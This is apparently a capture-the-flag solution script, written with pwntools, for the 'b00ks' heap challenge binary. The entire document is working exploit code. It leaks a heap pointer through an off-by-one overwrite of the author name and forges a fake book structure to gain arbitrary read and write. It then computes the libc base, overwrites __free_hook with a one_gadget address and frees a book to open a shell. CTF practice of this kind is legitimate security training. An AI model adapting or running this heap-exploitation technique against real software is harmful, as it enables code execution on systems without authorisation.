from pwn import *
context.log_level="info"

binary=ELF("b00ks")
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
io=process("./b00ks")


def createbook(name_size,name,des_size,des):
	io.readuntil("> ")
	io.sendline("1")
	io.readuntil(": ")
	io.sendline(str(name_size))
	io.readuntil(": ")
	io.sendline(name)
	io.readuntil(": ")
	io.sendline(str(des_size))
	io.readuntil(": ")
	io.sendline(des)

def printbook(id):
	io.readuntil("> ")
	io.sendline("4")
	io.readuntil(": ")
	for i in range(id):
		book_id=int(io.readline()[:-1])
		io.readuntil(": ")
		book_name=io.readline()[:-1]
		io.readuntil(": ")
		book_des=io.readline()[:-1]
		io.readuntil(": ")
		book_author=io.readline()[:-1]
	return book_id,book_name,book_des,book_author

def createname(name):
	io.readuntil("name: ")
	io.sendline(name)

def changename(name):
	io.readuntil("> ")
	io.sendline("5")
	io.readuntil(": ")
	io.sendline(name)

def editbook(book_id,new_des):
	io.readuntil("> ")
	io.sendline("3")
	io.readuntil(": ")
	io.writeline(str(book_id))
	io.readuntil(": ")
	io.sendline(new_des)

def deletebook(book_id):
	io.readuntil("> ")
	io.sendline("2")
	io.readuntil(": ")
	io.sendline(str(book_id))

createname("A"*32)
createbook(128,"a",32,"a")
createbook(0x21000,"a",0x21000,"b")


book_id_1,book_name,book_des,book_author=printbook(1)
book1_addr=u64(book_author[32:32+6].ljust(8,'\x00'))
log.success("book1_address:"+hex(book1_addr))

payload=p64(1)+p64(book1_addr+0x38)+p64(book1_addr+0x40)+p64(0xffff)
editbook(book_id_1,payload)
changename("A"*32)
book_id_1,book_name,book_des,book_author=printbook(1)
book2_name_addr=u64(book_name.ljust(8,"\x00"))
book2_des_addr=u64(book_des.ljust(8,"\x00"))
log.success("book2 name addr:"+hex(book2_name_addr))
log.success("book2 des addr:"+hex(book2_des_addr))
libc_base=book2_des_addr-0x5b9010
log.success("libc base:"+hex(libc_base))

free_hook=libc_base+libc.symbols["__free_hook"]
one_gadget=libc_base+0x4f322 #0x4f2c5 0x10a38c 0x4f322
log.success("free_hook:"+hex(free_hook))
log.success("one_gadget:"+hex(one_gadget))
editbook(1,p64(free_hook)*2)
editbook(2,p64(one_gadget))
#gdb.attach(io)


deletebook(2)


io.interactive()
